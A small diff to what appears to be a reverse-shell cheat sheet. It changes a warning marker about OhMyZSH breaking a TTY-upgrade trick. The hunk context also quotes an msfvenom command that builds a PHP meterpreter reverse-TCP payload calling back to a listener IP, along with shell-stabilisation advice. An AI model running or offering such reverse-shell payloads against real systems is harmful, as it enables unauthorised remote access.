@@ -282,7 +282,7 @@ $ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw
 
 Access shortcuts, su, nano and autocomplete in a partially tty shell
 
-/!\ OhMyZSH might break this trick, a simple `sh` is recommended
+:warning: OhMyZSH might break this trick, a simple `sh` is recommended
 
 > The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect
 
